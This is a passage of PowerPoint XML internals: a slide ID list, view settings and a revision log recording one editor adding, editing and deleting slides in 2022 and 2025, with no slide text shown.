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7"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="256" r:id="rId2"/>
    <p:sldId id="307" r:id="rId3"/>
    <p:sldId id="283" r:id="rId4"/>
    <p:sldId id="282" r:id="rId5"/>
    <p:sldId id="314" r:id="rId6"/>
    <p:sldId id="399" r:id="rId7"/>
    <p:sldId id="400" r:id="rId8"/>
    <p:sldId id="490" r:id="rId9"/>
    <p:sldId id="491" r:id="rId10"/>
    <p:sldId id="492" r:id="rId11"/>
    <p:sldId id="493" r:id="rId12"/>
    <p:sldId id="348" r:id="rId13"/>
    <p:sldId id="350" r:id="rId14"/>
    <p:sldId id="351" r:id="rId15"/>
    <p:sldId id="296" r:id="rId16"/>
    <p:sldId id="308" r:id="rId17"/>
    <p:sldId id="355" r:id="rId18"/>
    <p:sldId id="285" r:id="rId19"/>
    <p:sldId id="316" r:id="rId20"/>
    <p:sldId id="357" r:id="rId21"/>
    <p:sldId id="358" r:id="rId22"/>
    <p:sldId id="369" r:id="rId23"/>
    <p:sldId id="359" r:id="rId24"/>
    <p:sldId id="494" r:id="rId25"/>
    <p:sldId id="360" r:id="rId26"/>
    <p:sldId id="382" r:id="rId27"/>
    <p:sldId id="383" r:id="rId28"/>
    <p:sldId id="372" r:id="rId29"/>
    <p:sldId id="495" r:id="rId30"/>
    <p:sldId id="373" r:id="rId31"/>
    <p:sldId id="375" r:id="rId32"/>
    <p:sldId id="376" r:id="rId33"/>
    <p:sldId id="377" r:id="rId34"/>
    <p:sldId id="378" r:id="rId35"/>
    <p:sldId id="379" r:id="rId36"/>
    <p:sldId id="380" r:id="rId37"/>
    <p:sldId id="374" r:id="rId38"/>
    <p:sldId id="496" r:id="rId39"/>
    <p:sldId id="318" r:id="rId40"/>
    <p:sldId id="381" r:id="rId41"/>
    <p:sldId id="384" r:id="rId42"/>
    <p:sldId id="385" r:id="rId43"/>
    <p:sldId id="353" r:id="rId44"/>
    <p:sldId id="386" r:id="rId45"/>
    <p:sldId id="387" r:id="rId46"/>
    <p:sldId id="388" r:id="rId47"/>
    <p:sldId id="286" r:id="rId48"/>
    <p:sldId id="390" r:id="rId49"/>
    <p:sldId id="392" r:id="rId50"/>
    <p:sldId id="389" r:id="rId51"/>
    <p:sldId id="394" r:id="rId52"/>
    <p:sldId id="395" r:id="rId53"/>
    <p:sldId id="393" r:id="rId54"/>
    <p:sldId id="396" r:id="rId55"/>
    <p:sldId id="397" r:id="rId56"/>
    <p:sldId id="352" r:id="rId57"/>
    <p:sldId id="408" r:id="rId58"/>
    <p:sldId id="409" r:id="rId59"/>
    <p:sldId id="319" r:id="rId60"/>
    <p:sldId id="398" r:id="rId61"/>
    <p:sldId id="320" r:id="rId62"/>
    <p:sldId id="321" r:id="rId63"/>
    <p:sldId id="401" r:id="rId64"/>
    <p:sldId id="324" r:id="rId65"/>
    <p:sldId id="402" r:id="rId66"/>
    <p:sldId id="404" r:id="rId67"/>
    <p:sldId id="405" r:id="rId68"/>
    <p:sldId id="403" r:id="rId69"/>
    <p:sldId id="406" r:id="rId70"/>
    <p:sldId id="323" r:id="rId71"/>
    <p:sldId id="322" r:id="rId72"/>
    <p:sldId id="448" r:id="rId73"/>
    <p:sldId id="422" r:id="rId74"/>
    <p:sldId id="440" r:id="rId75"/>
    <p:sldId id="509" r:id="rId76"/>
    <p:sldId id="425" r:id="rId77"/>
    <p:sldId id="423" r:id="rId78"/>
    <p:sldId id="507" r:id="rId79"/>
    <p:sldId id="424" r:id="rId80"/>
    <p:sldId id="426" r:id="rId81"/>
    <p:sldId id="427" r:id="rId82"/>
    <p:sldId id="428" r:id="rId83"/>
    <p:sldId id="429" r:id="rId84"/>
    <p:sldId id="441" r:id="rId85"/>
    <p:sldId id="442" r:id="rId86"/>
    <p:sldId id="443" r:id="rId87"/>
    <p:sldId id="444" r:id="rId88"/>
    <p:sldId id="445" r:id="rId89"/>
    <p:sldId id="446" r:id="rId90"/>
    <p:sldId id="508" r:id="rId91"/>
    <p:sldId id="449" r:id="rId92"/>
    <p:sldId id="354" r:id="rId93"/>
    <p:sldId id="344" r:id="rId94"/>
    <p:sldId id="315" r:id="rId95"/>
    <p:sldId id="450" r:id="rId9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265C38-B650-4562-A8F5-8DB033515C30}" v="89" dt="2025-03-19T19:30:19.81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17" autoAdjust="0"/>
    <p:restoredTop sz="94660"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="63" d="100"/>
          <a:sy n="63" d="100"/>
        </p:scale>
        <p:origin x="8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6/11/relationships/changesInfo" Target="changesInfos/changesInfo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 Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AFF4EFD1-8823-4EEE-9836-0BA835B97EE5}"/>
    <pc:docChg chg="undo custSel addSld modSld">
      <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AFF4EFD1-8823-4EEE-9836-0BA835B97EE5}" dt="2022-08-17T10:09:56.253" v="539"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="addSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AFF4EFD1-8823-4EEE-9836-0BA835B97EE5}" dt="2022-08-17T10:01:09.113" v="255" actId="6549"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1700945982" sldId="266"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AFF4EFD1-8823-4EEE-9836-0BA835B97EE5}" dt="2022-08-17T10:09:56.253" v="539"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4131219684" sldId="267"/>
        </pc:sldMkLst>
      </pc:sldChg>
    </pc:docChg>
  </pc:docChgLst>
  <pc:docChgLst>
    <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}"/>
    <pc:docChg chg="undo custSel addSld delSld modSld sldOrd">
      <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-20T07:36:10.141" v="1702" actId="20577"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T15:59:44.862" v="12" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1942183190" sldId="256"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T15:59:44.862" v="12" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1942183190" sldId="256"/>
            <ac:spMk id="8" creationId="{589639F8-8852-EA41-2314-83927C1B138A}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:00:01.855" v="14" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="492019113" sldId="274"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:00:01.855" v="14" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1487464807" sldId="275"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3634448043" sldId="282"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:00:01.855" v="14" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3307480244" sldId="283"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3524714974" sldId="283"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:01:26.829" v="21"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1611998026" sldId="284"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3650368615" sldId="285"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2064699807" sldId="286"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:00:01.855" v="14" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4196699948" sldId="287"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="823084519" sldId="296"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:33.904" v="309" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3274192253" sldId="307"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:33.904" v="309" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3274192253" sldId="307"/>
            <ac:spMk id="5122" creationId="{00000000-0000-0000-0000-000000000000}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="265106335" sldId="308"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2060039332" sldId="314"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2133613946" sldId="315"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2787169713" sldId="316"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3143152445" sldId="318"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1891612144" sldId="319"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3634256623" sldId="320"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="457846813" sldId="321"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="588562779" sldId="322"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1687481207" sldId="323"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3716732749" sldId="324"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2646409532" sldId="344"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T16:05:51.676" v="1132" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3328506669" sldId="346"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T16:05:51.676" v="1132" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3328506669" sldId="346"/>
            <ac:spMk id="5122" creationId="{00000000-0000-0000-0000-000000000000}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:01:53.402" v="40"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="595429778" sldId="347"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:00:01.855" v="14" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2072729144" sldId="347"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="748044440" sldId="348"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:02:01.787" v="45" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1381030460" sldId="348"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:02:01.787" v="45" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4167028184" sldId="349"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:02:01.787" v="45" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="99294126" sldId="350"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4233839096" sldId="350"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:02:01.787" v="45" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2199923523" sldId="351"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2232291841" sldId="351"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:02:01.787" v="45" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1022716437" sldId="352"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4087151815" sldId="352"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:02:01.787" v="45" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3154301147" sldId="353"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3985075604" sldId="353"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3986174731" sldId="354"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:02:01.787" v="45" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4041402842" sldId="354"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="959203693" sldId="355"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:02:01.787" v="45" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3280659178" sldId="355"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:02:01.787" v="45" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="57207058" sldId="356"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1054372392" sldId="357"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:02:01.787" v="45" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2473513936" sldId="357"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:02:01.787" v="45" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2558615426" sldId="358"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3148908113" sldId="358"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:02:01.787" v="45" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1010282" sldId="359"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2647045171" sldId="359"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:02:01.787" v="45" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1762576592" sldId="360"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2157736222" sldId="360"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:02:01.787" v="45" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2535825750" sldId="361"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
